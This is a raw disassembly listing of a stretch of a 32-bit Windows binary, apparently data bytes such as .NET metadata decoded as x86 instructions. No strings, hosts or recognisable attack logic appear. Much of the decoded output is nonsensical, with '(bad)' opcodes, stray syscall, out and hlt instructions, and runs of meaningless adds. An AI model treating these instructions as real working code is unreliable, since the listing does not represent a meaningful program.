  405cf3:	15 06 00 6a 1d       	adc    $0x1d6a0006,%eax
  405cf8:	55                   	push   %ebp
  405cf9:	00 16                	add    %dl,(%esi)
  405cfb:	00 07                	add    %al,(%edi)
  405cfd:	17                   	pop    %ss
  405cfe:	e6 02                	out    %al,$0x2
  405d00:	06                   	push   %es
  405d01:	00 39                	add    %bh,(%ecx)
  405d03:	0e                   	push   %cs
  405d04:	55                   	push   %ebp
  405d05:	00 06                	add    %al,(%esi)
  405d07:	00 76 06             	add    %dh,0x6(%esi)
  405d0a:	66 02 06             	data16 add (%esi),%al
  405d0d:	00 78 0f             	add    %bh,0xf(%eax)
  405d10:	66 02 06             	data16 add (%esi),%al
  405d13:	00 0c 05 66 02 06 00 	add    %cl,0x60266(,%eax,1)
  405d1a:	7f 14                	jg     0x405d30
  405d1c:	66 02 06             	data16 add (%esi),%al
  405d1f:	00 2e                	add    %ch,(%esi)
  405d21:	12 66 02             	adc    0x2(%esi),%ah
  405d24:	16                   	push   %ss
  405d25:	00 47 12             	add    %al,0x12(%edi)
  405d28:	66 15 1a 00          	adc    $0x1a,%ax
  405d2c:	fe                   	(bad)
  405d2d:	13 87 1a 1a 00 83    	adc    -0x7cffe5e6(%edi),%eax
  405d33:	11 87 1a 8b 01 b7    	adc    %eax,-0x48fe74e6(%edi)
  405d39:	14 00                	adc    $0x0,%al
  405d3b:	00 1a                	add    %bl,(%edx)
  405d3d:	00 23                	add    %ah,(%ebx)
  405d3f:	19 87 1a 06 00 3e    	sbb    %eax,0x3e00061a(%edi)
  405d45:	15 f6 0f 06 00       	adc    $0x60ff6,%eax
  405d4a:	7a 00                	jp     0x405d4c
  405d4c:	f6 0f 06             	testb  $0x6,(%edi)
  405d4f:	00 ed                	add    %ch,%ch
  405d51:	0f f6 0f             	psadbw (%edi),%mm1
  405d54:	06                   	push   %es
  405d55:	00 e4                	add    %ah,%ah
  405d57:	00 f6                	add    %dh,%dh
  405d59:	0f 06                	clts
  405d5b:	00 e6                	add    %ah,%dh
  405d5d:	12 00                	adc    (%eax),%al
  405d5f:	1d 06 00 35 10       	sbb    $0x10350006,%eax
  405d64:	00 1d 06 00 b1 07    	add    %bl,0x7b10006
  405d6a:	f6 0f 06             	testb  $0x6,(%edi)
  405d6d:	00 88 10 f6 0f 1e    	add    %cl,0x1e0ff610(%eax)
  405d73:	00 2c 11             	add    %ch,(%ecx,%edx,1)
  405d76:	ae                   	scas   %es:(%edi),%al
  405d77:	17                   	pop    %ss
  405d78:	06                   	push   %es
  405d79:	00 a1 1d c0 0e 06    	add    %ah,0x60ec01d(%ecx)
  405d7f:	00 da                	add    %bl,%dl
  405d81:	0e                   	push   %cs
  405d82:	c0 0e 06             	rorb   $0x6,(%esi)
  405d85:	00 84 06 c0 0e 06 00 	add    %al,0x60ec0(%esi,%eax,1)
  405d8c:	79 03                	jns    0x405d91
  405d8e:	f6 0f 06             	testb  $0x6,(%edi)
  405d91:	00 24 06             	add    %ah,(%esi,%eax,1)
  405d94:	a0 0b 0a 00 17       	mov    0x17000a0b,%al
  405d99:	14 55                	adc    $0x55,%al
  405d9b:	00 0a                	add    %cl,(%edx)
  405d9d:	00 9b 18 55 00 06    	add    %bl,0x6005518(%ebx)
  405da3:	00 da                	add    %bl,%dl
  405da5:	04 55                	add    $0x55,%al
  405da7:	00 43 00             	add    %al,0x0(%ebx)
  405daa:	f4                   	hlt
  405dab:	14 00                	adc    $0x0,%al
  405dad:	00 12                	add    %dl,(%edx)
  405daf:	00 a7 05 c2 12 06    	add    %ah,0x612c205(%edi)
  405db5:	00 12                	add    %dl,(%edx)
  405db7:	00 cb                	add    %cl,%bl
  405db9:	02 06                	add    (%esi),%al
  405dbb:	00 ba 10 f6 0f 06    	add    %bh,0x60ff610(%edx)
  405dc1:	00 1d 1d 57 11 06    	add    %bl,0x611571d
  405dc7:	00 3d 08 f6 0f 06    	add    %bh,0x60ff608
  405dcd:	00 ff                	add    %bh,%bh
  405dcf:	14 f6                	adc    $0xf6,%al
  405dd1:	0f 06                	clts
  405dd3:	00 00                	add    %al,(%eax)
  405dd5:	06                   	push   %es
  405dd6:	f6 0f 22             	testb  $0x22,(%edi)
  405dd9:	00 54 12 5d          	add    %dl,0x5d(%edx,%edx,1)
  405ddd:	13 22                	adc    (%edx),%esp
  405ddf:	00 d5                	add    %dl,%ch
  405de1:	16                   	push   %ss
  405de2:	5d                   	pop    %ebp
  405de3:	13 22                	adc    (%edx),%esp
  405de5:	00 84 13 5d 13 12 00 	add    %al,0x12135d(%ebx,%edx,1)
  405dec:	7c 13                	jl     0x405e01
  405dee:	a3 15 22 00 ed       	mov    %eax,0xed002215
  405df3:	16                   	push   %ss
  405df4:	5d                   	pop    %ebp
  405df5:	13 06                	adc    (%esi),%eax
  405df7:	00 5d 16             	add    %bl,0x16(%ebp)
  405dfa:	00 1d 06 00 f3 11    	add    %bl,0x11f30006
  405e00:	f6 0f 06             	testb  $0x6,(%edi)
  405e03:	00 64 16 00          	add    %ah,0x0(%esi,%edx,1)
  405e07:	1d 12 00 18 13       	sbb    $0x13180012,%eax
  405e0c:	00 1d 06 00 ac 0f    	add    %bl,0xfac0006
  405e12:	00 1d 06 00 05 01    	add    %bl,0x1050006
  405e18:	00 1d 06 00 dd 11    	add    %bl,0x11dd0006
  405e1e:	f6 0f 06             	testb  $0x6,(%edi)
  405e21:	00 0e                	add    %cl,(%esi)
  405e23:	10 00                	adc    %al,(%eax)
  405e25:	1d 06 00 51 05       	sbb    $0x5510006,%eax
  405e2a:	00 1d 06 00 15 05    	add    %bl,0x5150006
  405e30:	00 1d 06 00 4f 10    	add    %bl,0x104f0006
  405e36:	00 1d 06 00 30 05    	add    %bl,0x5300006
  405e3c:	00 1d 06 00 c6 11    	add    %bl,0x11c60006
  405e42:	00 1d 06 00 a5 13    	add    %bl,0x13a50006
  405e48:	f6 0f 06             	testb  $0x6,(%edi)
  405e4b:	00 93 1c f6 0f 06    	add    %dl,0x60ff61c(%ebx)
  405e51:	00 07                	add    %al,(%edi)
  405e53:	18 a3 15 06 00 dd    	sbb    %ah,-0x22fff9eb(%ebx)
  405e59:	05 f6 0f 06 00       	add    $0x60ff6,%eax
  405e5e:	30 03                	xor    %al,(%ebx)
  405e60:	00 1d 06 00 d1 00    	add    %bl,0xd10006
  405e66:	f6 0f 06             	testb  $0x6,(%edi)
  405e69:	00 cb                	add    %cl,%bl
  405e6b:	05 f6 0f 06 00       	add    $0x60ff6,%eax
  405e70:	49                   	dec    %ecx
  405e71:	06                   	push   %es
  405e72:	f6 0f 06             	testb  $0x6,(%edi)
  405e75:	00 36                	add    %dh,(%esi)
  405e77:	18 66 02             	sbb    %ah,0x2(%esi)
  405e7a:	06                   	push   %es
  405e7b:	00 42 08             	add    %al,0x8(%edx)
  405e7e:	66 02 0a             	data16 add (%edx),%cl
  405e81:	00 b9 0f 16 11 0a    	add    %bh,0xa11160f(%ecx)
  405e87:	00 41 05             	add    %al,0x5(%ecx)
  405e8a:	16                   	push   %ss
  405e8b:	11 00                	adc    %eax,(%eax)
  405e8d:	00 00                	add    %al,(%eax)
  405e8f:	00 4a 01             	add    %cl,0x1(%edx)
  405e92:	00 00                	add    %al,(%eax)
  405e94:	00 00                	add    %al,(%eax)
  405e96:	01 00                	add    %eax,(%eax)
  405e98:	01 00                	add    %eax,(%eax)
  405e9a:	01 00                	add    %eax,(%eax)
  405e9c:	10 00                	adc    %al,(%eax)
  405e9e:	d1 0f                	rorl   $1,(%edi)
  405ea0:	80 1a 05             	sbbb   $0x5,(%edx)
  405ea3:	00 01                	add    %al,(%ecx)
  405ea5:	00 01                	add    %al,(%ecx)
  405ea7:	00 81 01 10 00 19    	add    %al,0x19001001(%ecx)
  405ead:	17                   	pop    %ss
  405eae:	80 1a 05             	sbbb   $0x5,(%edx)
  405eb1:	00 01                	add    %al,(%ecx)
  405eb3:	00 03                	add    %al,(%ebx)
  405eb5:	00 81 01 10 00 a1    	add    %al,-0x5effefff(%ecx)
  405ebb:	19 9e 11 05 00 13    	sbb    %ebx,0x13000511(%esi)
  405ec1:	00 06                	add    %al,(%esi)
  405ec3:	00 00                	add    %al,(%eax)
  405ec5:	00 10                	add    %dl,(%eax)
  405ec7:	00 b4 12 0e 0f 05 00 	add    %dh,0x50f0e(%edx,%edx,1)
  405ece:	1e                   	push   %ds
  405ecf:	00 24 00             	add    %ah,(%eax,%eax,1)
  405ed2:	00 00                	add    %al,(%eax)
  405ed4:	10 00                	adc    %al,(%eax)
  405ed6:	39 17                	cmp    %edx,(%edi)
  405ed8:	3d 14 05 00 1e       	cmp    $0x1e000514,%eax
  405edd:	00 26                	add    %ah,(%esi)
  405edf:	00 81 01 10 00 90    	add    %al,-0x6fffefff(%ecx)
  405ee5:	10 3d 14 05 00 1e    	adc    %bh,0x1e000514
  405eeb:	00 2d 00 81 01 10    	add    %ch,0x10018100
  405ef1:	00 4d 13             	add    %cl,0x13(%ebp)
  405ef4:	3d 14 05 00 1e       	cmp    $0x1e000514,%eax
  405ef9:	00 2f                	add    %ch,(%edi)
  405efb:	00 81 01 10 00 5e    	add    %al,0x5e001001(%ecx)
  405f01:	15 3d 14 05 00       	adc    $0x5143d,%eax
  405f06:	1e                   	push   %ds
  405f07:	00 30                	add    %dh,(%eax)
  405f09:	00 81 01 10 00 5d    	add    %al,0x5d001001(%ecx)
  405f0f:	0f 3d                	(bad)
  405f11:	14 05                	adc    $0x5,%al
  405f13:	00 1e                	add    %bl,(%esi)
  405f15:	00 36                	add    %dh,(%esi)
  405f17:	00 81 01 10 00 58    	add    %al,0x58001001(%ecx)
  405f1d:	15 3d 14 05 00       	adc    $0x5143d,%eax
  405f22:	1f                   	pop    %ds
  405f23:	00 38                	add    %bh,(%eax)
  405f25:	00 02                	add    %al,(%edx)
  405f27:	01 00                	add    %eax,(%eax)
  405f29:	00 0b                	add    %cl,(%ebx)
  405f2b:	02 00                	add    (%eax),%al
  405f2d:	00 39                	add    %bh,(%ecx)
  405f2f:	00 1f                	add    %bl,(%edi)
  405f31:	00 3e                	add    %bh,(%esi)
  405f33:	00 81 01 10 00 9e    	add    %al,-0x61ffefff(%ecx)
  405f39:	0e                   	push   %cs
  405f3a:	3d 14 05 00 23       	cmp    $0x23000514,%eax
  405f3f:	00 3e                	add    %bh,(%esi)
  405f41:	00 81 01 10 00 67    	add    %al,0x67001001(%ecx)
  405f47:	1d 3d 14 05 00       	sbb    $0x5143d,%eax
  405f4c:	23 00                	and    (%eax),%eax
  405f4e:	41                   	inc    %ecx
  405f4f:	00 81 01 10 00 9a    	add    %al,-0x65ffefff(%ecx)
  405f55:	19 7c 19 05          	sbb    %edi,0x5(%ecx,%ebx,1)
  405f59:	00 24 00             	add    %ah,(%eax,%eax,1)
  405f5c:	46                   	inc    %esi
  405f5d:	00 83 01 10 00 80    	add    %al,-0x7fffefff(%ebx)
  405f63:	00 00                	add    %al,(%eax)
  405f65:	00 05 00 25 00 4b    	add    %al,0x4b002500
  405f6b:	00 01                	add    %al,(%ecx)
  405f6d:	00 10                	add    %dl,(%eax)
  405f6f:	00 17                	add    %dl,(%edi)
  405f71:	01 fd                	add    %edi,%ebp
  405f73:	0f 05                	syscall
  405f75:	00 26                	add    %ah,(%esi)
  405f77:	00 4b 00             	add    %cl,0x0(%ebx)
  405f7a:	81 01 10 00 10 01    	addl   $0x1100010,(%ecx)
  405f80:	fd                   	std
  405f81:	0f 05                	syscall
  405f83:	00 2d 00 52 00 00    	add    %ch,0x5200
  405f89:	01 00                	add    %eax,(%eax)
  405f8b:	00 62 01             	add    %ah,0x1(%edx)
  405f8e:	00 00                	add    %al,(%eax)
  405f90:	05 00 2d 00 54       	add    $0x54002d00,%eax
  405f95:	00 13                	add    %dl,(%ebx)
  405f97:	01 00                	add    %eax,(%eax)
  405f99:	00 38                	add    %bh,(%eax)
  405f9b:	00 00                	add    %al,(%eax)
  405f9d:	00 51 00             	add    %dl,0x0(%ecx)
  405fa0:	2e 00 54 00 01       	add    %dl,%cs:0x1(%eax,%eax,1)
  405fa5:	00 10                	add    %dl,(%eax)
  405fa7:	00 a3 17 c7 0d 05    	add    %ah,0x50dc717(%ebx)
  405fad:	00 2e                	add    %ch,(%esi)
  405faf:	00 54 00 01          	add    %dl,0x1(%eax,%eax,1)
  405fb3:	00 10                	add    %dl,(%eax)
  405fb5:	00 60 10             	add    %ah,0x10(%eax)
  405fb8:	c7                   	(bad)
  405fb9:	0d 05 00 2f 00       	or     $0x2f0005,%eax
  405fbe:	5f                   	pop    %edi
  405fbf:	00 01                	add    %al,(%ecx)
  405fc1:	00 10                	add    %dl,(%eax)
  405fc3:	00 6d 1c             	add    %ch,0x1c(%ebp)
  405fc6:	c7                   	(bad)
  405fc7:	0d 05 00 31 00       	or     $0x310005,%eax
  405fcc:	63 00                	arpl   %eax,(%eax)
  405fce:	01 00                	add    %eax,(%eax)
  405fd0:	10 00                	adc    %al,(%eax)
  405fd2:	e2 0d                	loop   0x405fe1
  405fd4:	c7                   	(bad)
  405fd5:	0d 05 00 33 00       	or     $0x330005,%eax
  405fda:	6a 00                	push   $0x0
  405fdc:	01 01                	add    %eax,(%ecx)
  405fde:	00 00                	add    %al,(%eax)
  405fe0:	16                   	push   %ss
  405fe1:	08 c7                	or     %al,%bh
  405fe3:	0d 39 00 3a 00       	or     $0x3a0039,%eax
  405fe8:	95                   	xchg   %eax,%ebp
  405fe9:	00 00                	add    %al,(%eax)
  405feb:	00 10                	add    %dl,(%eax)
  405fed:	00 8e 17 c7 0d 05    	add    %cl,0x50dc717(%esi)
  405ff3:	00 47 00             	add    %al,0x0(%edi)
  405ff6:	95                   	xchg   %eax,%ebp
  405ff7:	00 00                	add    %al,(%eax)
  405ff9:	00 10                	add    %dl,(%eax)
  405ffb:	00 98 17 c7 0d 05    	add    %bl,0x50dc717(%eax)
  406001:	00 47 00             	add    %al,0x0(%edi)
  406004:	99                   	cltd
  406005:	00 81 01 10 00 8e    	add    %al,-0x71ffefff(%ecx)
  40600b:	12 c7                	adc    %bh,%al
  40600d:	0d 05 00 47 00       	or     $0x470005,%eax
  406012:	a2 00 00 01 00       	mov    %al,0x10000
  406017:	00 53 01             	add    %dl,0x1(%ebx)
  40601a:	00 00                	add    %al,(%eax)
  40601c:	05 00 47 00 a4       	add    $0xa4004700,%eax
  406021:	00 13                	add    %dl,(%ebx)
  406023:	01 00                	add    %eax,(%eax)
  406025:	00 25 01 00 00 51    	add    %ah,0x51000001
  40602b:	00 48 00             	add    %cl,0x0(%eax)
  40602e:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  40602f:	00 16                	add    %dl,(%esi)
  406031:	00 a8 18 12 00 16    	add    %ch,0x16001218(%eax)
  406037:	00 b5 18 12 00 16    	add    %dh,0x16001218(%ebp)
  40603d:	00 0e                	add    %cl,(%esi)
  40603f:	11 12                	adc    %edx,(%edx)
  406041:	00 16                	add    %dl,(%esi)
  406043:	00 15 0f 12 00 16    	add    %dl,0x1600120f
  406049:	00 3f                	add    %bh,(%edi)
  40604b:	13 12                	adc    (%edx),%edx
  40604d:	00 16                	add    %dl,(%esi)
  40604f:	00 50 06             	add    %dl,0x6(%eax)
  406052:	12 00                	adc    (%eax),%al
  406054:	16                   	push   %ss
  406055:	00 f7                	add    %dh,%bh
  406057:	1c 12                	sbb    $0x12,%al
  406059:	00 16                	add    %dl,(%esi)
  40605b:	00 a1 02 12 00 16    	add    %ah,0x16001202(%ecx)
  406061:	00 a5 08 12 00 16    	add    %ah,0x16001208(%ebp)
  406067:	00 58 08             	add    %bl,0x8(%eax)
  40606a:	12 00                	adc    (%eax),%al
  40606c:	16                   	push   %ss
  40606d:	00 9f 08 15 00 16    	add    %bl,0x16001508(%edi)
  406073:	00 ab 0d 12 00 16    	add    %ch,0x1600120d(%ebx)
  406079:	00 1e                	add    %bl,(%esi)
  40607b:	01 19                	add    %ebx,(%ecx)
  40607d:	00 16                	add    %dl,(%esi)
  40607f:	00 d6                	add    %dl,%dh
  406081:	10 12                	adc    %dl,(%edx)
  406083:	00 16                	add    %dl,(%esi)
  406085:	00 75 02             	add    %dh,0x2(%ebp)
  406088:	12 00                	adc    (%eax),%al
  40608a:	16                   	push   %ss
  40608b:	00 7e 03             	add    %bh,0x3(%esi)
  40608e:	12 00                	adc    (%eax),%al
  406090:	16                   	push   %ss
  406091:	00 4c 1c 12          	add    %cl,0x12(%esp,%ebx,1)
  406095:	00 16                	add    %dl,(%esi)
  406097:	00 ae 12 12 00 11    	add    %ch,0x11001212(%esi)
  40609d:	00 8a 04 21 00 11    	add    %cl,0x11002104(%edx)
  4060a3:	00 6f 04             	add    %ch,0x4(%edi)
  4060a6:	25 00 11 00 3f       	and    $0x3f001100,%eax
  4060ab:	04 29                	add    $0x29,%al
  4060ad:	00 11                	add    %dl,(%ecx)
  4060af:	00 d5                	add    %dl,%ch
  4060b1:	03 2d 00 11 00 57    	add    0x57001100,%ebp
  4060b7:	04 2d                	add    $0x2d,%al
  4060b9:	00 11                	add    %dl,(%ecx)
  4060bb:	00 ba 03 30 00 11    	add    %bh,0x11003003(%edx)
  4060c1:	00 9d 03 34 00 31    	add    %bl,0x31003403(%ebp)
  4060c7:	00 83 03 37 00 11    	add    %al,0x11003703(%ebx)
  4060cd:	00 f1                	add    %dh,%cl
  4060cf:	03 30                	add    (%eax),%esi
  4060d1:	00 11                	add    %dl,(%ecx)
  4060d3:	00 25 04 3a 00 11    	add    %ah,0x11003a04
  4060d9:	00 07                	add    %al,(%edi)
  4060db:	04 34                	add    $0x34,%al
  4060dd:	00 16                	add    %dl,(%esi)
  4060df:	00 92 12 dc 00 06    	add    %dl,0x600dc12(%edx)
  4060e5:	06                   	push   %es
  4060e6:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  4060e7:	02 06                	add    (%esi),%al
  4060e9:	01 56 80             	add    %edx,-0x80(%esi)
  4060ec:	7a 02                	jp     0x4060f0
  4060ee:	09 01                	or     %eax,(%ecx)
  4060f0:	56                   	push   %esi
  4060f1:	80 d8 01             	sbb    $0x1,%al
  4060f4:	09 01                	or     %eax,(%ecx)
  4060f6:	56                   	push   %esi
  4060f7:	80 c5 01             	add    $0x1,%ch
  4060fa:	09 01                	or     %eax,(%ecx)
  4060fc:	31 00                	xor    %eax,(%eax)
  4060fe:	08 02                	or     %al,(%edx)
  406100:	12 00                	adc    (%eax),%al
  406102:	16                   	push   %ss
  406103:	00 57 17             	add    %dl,0x17(%edi)
  406106:	30 01                	xor    %al,(%ecx)
  406108:	16                   	push   %ss
  406109:	00 0b                	add    %cl,(%ebx)
  40610b:	00 43 01             	add    %al,0x1(%ebx)
  40610e:	51                   	push   %ecx
  40610f:	80 9d 0d 3a 00 51 80 	sbbb   $0x80,0x51003a0d(%ebp)
  406116:	99                   	cltd
  406117:	0d 3a 00 51 80       	or     $0x8051003a,%eax
  40611c:	90                   	nop
  40611d:	0d 3a 00 51 80       	or     $0x8051003a,%eax
  406122:	74 0d                	je     0x406131
  406124:	3a 00                	cmp    (%eax),%al
  406126:	21 00                	and    %eax,(%eax)
  406128:	fb                   	sti
  406129:	1c 29                	sbb    $0x29,%al
  40612b:	00 21                	add    %ah,(%ecx)
  40612d:	00 dc                	add    %bl,%ah
  40612f:	1c 29                	sbb    $0x29,%al
  406131:	00 31                	add    %dh,(%ecx)
  406133:	00 fc                	add    %bh,%ah
  406135:	19 29                	sbb    %ebp,(%ecx)
  406137:	00 33                	add    %dh,(%ebx)
  406139:	01 81 01 8b 01 11    	add    %eax,0x11018b01(%ecx)
  40613f:	00 67 05             	add    %ah,0x5(%edi)
  406142:	8f 01                	pop    (%ecx)
  406144:	01 00                	add    %eax,(%eax)
  406146:	9c                   	pushf
  406147:	10 30                	adc    %dh,(%eax)
  406149:	01 01                	add    %eax,(%ecx)
  40614b:	00 bd 11 3a 00 01    	add    %bh,0x1003a11(%ebp)
  406151:	00 9c 10 30 01 01 00 	add    %bl,0x10130(%eax,%edx,1)
  406158:	37                   	aaa
  406159:	14 c7                	adc    $0xc7,%al
  40615b:	01 01                	add    %eax,(%ecx)
  40615d:	00 ac 07 12 00 01 00 	add    %ch,0x10012(%edi,%eax,1)
  406164:	8c 07                	mov    %es,(%edi)
  406166:	12 00                	adc    (%eax),%al
  406168:	01 00                	add    %eax,(%eax)
  40616a:	ae                   	scas   %es:(%edi),%al
  40616b:	0a 37                	or     (%edi),%dh
  40616d:	00 01                	add    %al,(%ecx)
  40616f:	00 0c 08             	add    %cl,(%eax,%ecx,1)
  406172:	02 02                	add    (%edx),%al
  406174:	01 00                	add    %eax,(%eax)
  406176:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  406177:	1a c7                	sbb    %bh,%al
  406179:	01 01                	add    %eax,(%ecx)
  40617b:	00 9c 10 30 01 01 00 	add    %bl,0x10130(%eax,%edx,1)
  406182:	8e 1c 06             	mov    (%esi,%eax,1),%ds
  406185:	02 06                	add    (%esi),%al
  406187:	06                   	push   %es
  406188:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  406189:	02 3a                	add    (%edx),%bh
  40618b:	00 56 80             	add    %dl,-0x80(%esi)
  40618e:	05 12 02 02 56       	add    $0x56020212,%eax
  406193:	80 58 0f 02          	sbbb   $0x2,0xf(%eax)
  406197:	02 56 80             	add    -0x80(%esi),%dl
  40619a:	7d 12                	jge    0x4061ae
  40619c:	02 02                	add    (%edx),%al
  40619e:	56                   	push   %esi
  40619f:	80 93 1c 02 02 56 80 	adcb   $0x80,0x5602021c(%ebx)
  4061a6:	cb                   	lret
  4061a7:	0c 02                	or     $0x2,%al
  4061a9:	02 56 80             	add    -0x80(%esi),%dl
  4061ac:	e7 13                	out    %eax,$0x13
  4061ae:	02 02                	add    (%edx),%al
  4061b0:	56                   	push   %esi
  4061b1:	80 d1 00             	adc    $0x0,%cl
  4061b4:	02 02                	add    (%edx),%al
  4061b6:	56                   	push   %esi
  4061b7:	80 88 10 02 02 56 80 	orb    $0x80,0x56020210(%eax)
  4061be:	12 19                	adc    (%ecx),%bl
  4061c0:	02 02                	add    (%edx),%al
  4061c2:	56                   	push   %esi
  4061c3:	80 49 06 02          	orb    $0x2,0x6(%ecx)
  4061c7:	02 56 80             	add    -0x80(%esi),%dl
  4061ca:	b1 07                	mov    $0x7,%cl
  4061cc:	02 02                	add    (%edx),%al
  4061ce:	56                   	push   %esi
  4061cf:	80 4c 1d 02 02       	orb    $0x2,0x2(%ebp,%ebx,1)
  4061d4:	33 01                	xor    (%ecx),%eax
  4061d6:	1b 02                	sbb    (%edx),%eax
  4061d8:	fd                   	std
  4061d9:	02 08                	add    (%eax),%cl
  4061db:	26 00 00             	add    %al,%es:(%eax)
  4061de:	00 00                	add    %al,(%eax)
  4061e0:	96                   	xchg   %eax,%esi
  4061e1:	00 a5 10 0a 00 01    	add    %ah,0x1000a10(%ebp)
  4061e7:	00 78 20             	add    %bh,0x20(%eax)
  4061ea:	00 00                	add    %al,(%eax)
  4061ec:	00 00                	add    %al,(%eax)
  4061ee:	86 18                	xchg   %bl,(%eax)
  4061f0:	09 15 0e 00 01 00    	or     %edx,0x1000e
  4061f6:	f8                   	clc
  4061f7:	26 00 00             	add    %al,%es:(%eax)
  4061fa:	00 00                	add    %al,(%eax)
  4061fc:	96                   	xchg   %eax,%esi
  4061fd:	00 0f                	add    %cl,(%edi)
  4061ff:	17                   	pop    %ss
  406200:	1d 00 01 00 50       	sbb    $0x50000100,%eax
  406205:	28 00                	sub    %al,(%eax)
  406207:	00 00                	add    %al,(%eax)
  406209:	00 91 00 3f 0d 1d    	add    %dl,0x1d0d3f00(%ecx)
  40620f:	00 01                	add    %al,(%ecx)
  406211:	00 c0                	add    %al,%al
  406213:	28 00                	sub    %al,(%eax)
  406215:	00 00                	add    %al,(%eax)
  406217:	00 91 18 0f 15 0a    	add    %dl,0xa150f18(%ecx)
  40621d:	00 01                	add    %al,(%ecx)
  40621f:	00 80 20 00 00 00    	add    %al,0x20(%eax)
  406225:	00 96 08 56 1a 3d    	add    %dl,0x3d1a5608(%esi)
  40622b:	00 01                	add    %al,(%ecx)
  40622d:	00 87 20 00 00 00    	add    %al,0x20(%edi)
  406233:	00 96 08 64 1a 42    	add    %dl,0x421a6408(%esi)
  406239:	00 01                	add    %al,(%ecx)
  40623b:	00 8f 20 00 00 00    	add    %cl,0x20(%edi)
  406241:	00 96 08 3a 1a 48    	add    %dl,0x481a3a08(%esi)
  406247:	00 02                	add    %al,(%edx)
  406249:	00 96 20 00 00 00    	add    %dl,0x20(%esi)
  40624f:	00 96 08 48 1a 4d    	add    %dl,0x4d1a4808(%esi)
  406255:	00 02                	add    %al,(%edx)
  406257:	00 9e 20 00 00 00    	add    %bl,0x20(%esi)
  40625d:	00 91 08 96 13 53    	add    %dl,0x53139608(%ecx)
  406263:	00 03                	add    %al,(%ebx)
  406265:	00 a5 20 00 00 00    	add    %ah,0x20(%ebp)
  40626b:	00 91 08 a1 13 58    	add    %dl,0x5813a108(%ecx)
  406271:	00 03                	add    %al,(%ebx)
  406273:	00 ad 20 00 00 00    	add    %ch,0x20(%ebp)
  406279:	00 91 08 1e 0b 5e    	add    %dl,0x5e0b1e08(%ecx)
  40627f:	00 04 00             	add    %al,(%eax,%eax,1)
  406282:	b4 20                	mov    $0x20,%ah
  406284:	00 00                	add    %al,(%eax)
  406286:	00 00                	add    %al,(%eax)
  406288:	91                   	xchg   %eax,%ecx
  406289:	08 2d 0b 62 00 04    	or     %ch,0x400620b
  40628f:	00 bc 20 00 00 00 00 	add    %bh,0x0(%eax,%eiz,1)
  406296:	91                   	xchg   %eax,%ecx
  406297:	08 d3                	or     %dl,%bl
  406299:	19 5e 00             	sbb    %ebx,0x0(%esi)
  40629c:	05 00 c3 20 00       	add    $0x20c300,%eax
  4062a1:	00 00                	add    %al,(%eax)
  4062a3:	00 91 08 de 19 62    	add    %dl,0x6219de08(%ecx)
  4062a9:	00 05 00 cb 20 00    	add    %al,0x20cb00
  4062af:	00 00                	add    %al,(%eax)
  4062b1:	00 91 08 d1 0a 67    	add    %dl,0x670ad108(%ecx)
  4062b7:	00 06                	add    %al,(%esi)
  4062b9:	00 d2                	add    %dl,%dl
  4062bb:	20 00                	and    %al,(%eax)
  4062bd:	00 00                	add    %al,(%eax)
  4062bf:	00 91 08 df 0a 6c    	add    %dl,0x6c0adf08(%ecx)
  4062c5:	00 06                	add    %al,(%esi)
  4062c7:	00 da                	add    %bl,%dl
  4062c9:	20 00                	and    %al,(%eax)
  4062cb:	00 00                	add    %al,(%eax)
  4062cd:	00 96 08 4c 03 1d    	add    %dl,0x1d034c08(%esi)
  4062d3:	00 07                	add    %al,(%edi)
  4062d5:	00 e1                	add    %ah,%cl
  4062d7:	20 00                	and    %al,(%eax)
  4062d9:	00 00                	add    %al,(%eax)
  4062db:	00 96 08 5c 03 72    	add    %dl,0x72035c08(%esi)
  4062e1:	00 07                	add    %al,(%edi)
  4062e3:	00 e9                	add    %ch,%cl
  4062e5:	20 00                	and    %al,(%eax)
  4062e7:	00 00                	add    %al,(%eax)
  4062e9:	00 91 08 fc 02 77    	add    %dl,0x7702fc08(%ecx)
  4062ef:	00 08                	add    %cl,(%eax)
  4062f1:	00 f0                	add    %dh,%al
  4062f3:	20 00                	and    %al,(%eax)
  4062f5:	00 00                	add    %al,(%eax)
  4062f7:	00 91 08 8e 0b 67    	add    %dl,0x670b8e08(%ecx)
  4062fd:	00 08                	add    %cl,(%eax)
  4062ff:	00 f7                	add    %dh,%bh
  406301:	20 00                	and    %al,(%eax)
  406303:	00 00                	add    %al,(%eax)
  406305:	00 91 08 97 0b 6c    	add    %dl,0x6c0b9708(%ecx)
  40630b:	00 08                	add    %cl,(%eax)
  40630d:	00 ff                	add    %bh,%bh
  40630f:	20 00                	and    %al,(%eax)
  406311:	00 00                	add    %al,(%eax)
  406313:	00 96 08 f4 0e 7b    	add    %dl,0x7b0ef408(%esi)
  406319:	00 09                	add    %cl,(%ecx)
  40631b:	00 06                	add    %al,(%esi)
  40631d:	21 00                	and    %eax,(%eax)
  40631f:	00 00                	add    %al,(%eax)
  406321:	00 96 08 01 0f 7f    	add    %dl,0x7f0f0108(%esi)
  406327:	00 09                	add    %cl,(%ecx)
  406329:	00 0e                	add    %cl,(%esi)
  40632b:	21 00                	and    %eax,(%eax)
  40632d:	00 00                	add    %al,(%eax)
  40632f:	00 96 08 eb 0c 1d    	add    %dl,0x1d0ceb08(%esi)
  406335:	00 0a                	add    %cl,(%edx)
  406337:	00 15 21 00 00 00    	add    %dl,0x21
  40633d:	00 96 08 fc 0c 72    	add    %dl,0x720cfc08(%esi)
  406343:	00 0a                	add    %cl,(%edx)
  406345:	00 6c 29 00          	add    %ch,0x0(%ecx,%ebp,1)
  406349:	00 00                	add    %al,(%eax)
  40634b:	00 96 00 29 1a 0a    	add    %dl,0xa1a2900(%esi)
  406351:	00 0b                	add    %cl,(%ebx)
  406353:	00 1d 21 00 00 00    	add    %bl,0x21
  406359:	00 91 00 6d 07 84    	add    %dl,-0x7bf89300(%ecx)
  40635f:	00 0b                	add    %cl,(%ebx)
  406361:	00 28                	add    %ch,(%eax)
  406363:	21 00                	and    %eax,(%eax)
  406365:	00 00                	add    %al,(%eax)
  406367:	00 91 00 97 08 89    	add    %dl,-0x76f76900(%ecx)
  40636d:	00 0c 00             	add    %cl,(%eax,%eax,1)
  406370:	b8 2c 00 00 00       	mov    $0x2c,%eax
  406375:	00 96 00 58 19 0a    	add    %dl,0xa195800(%esi)
  40637b:	00 10                	add    %dl,(%eax)
  40637d:	00 40 2d             	add    %al,0x2d(%eax)
  406380:	00 00                	add    %al,(%eax)
  406382:	00 00                	add    %al,(%eax)
  406384:	96                   	xchg   %eax,%esi
